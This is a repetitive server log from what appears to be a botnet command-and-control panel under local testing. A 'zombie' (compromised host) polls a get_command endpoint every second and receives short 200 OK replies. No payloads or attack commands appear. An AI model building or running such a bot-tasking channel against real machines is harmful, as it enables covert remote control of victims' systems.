2025-06-24 23:23:37 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:39 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:40 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:41 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:42 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:44 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:46 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:47 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:49 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:50 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:51 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:52 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:53 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:54 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:55 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:56 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:57 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:58 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:23:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:23:59 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:23:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:23:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:23:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:01 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:02 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:04 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:06 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:07 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:09 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:10 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:11 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0019s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:12 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:13 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:14 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:15 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:16 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:17 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:18 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:19 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:21 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:22 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:23 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:24 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:25 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:26 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:27 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:29 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
